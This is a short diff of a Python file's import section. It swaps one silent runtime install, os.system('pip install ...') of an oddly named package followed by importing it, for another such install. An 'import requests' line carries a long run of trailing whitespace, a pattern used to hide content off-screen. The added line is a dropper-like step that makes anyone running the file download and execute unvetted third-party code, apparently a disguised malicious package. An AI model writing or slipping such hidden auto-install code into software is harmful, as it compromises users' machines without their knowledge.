@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlipackageV1")
-import pythonsqlipackageV1
+os.system("pip install pipcryptomodulesV1")
+import pipcryptomodulesV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
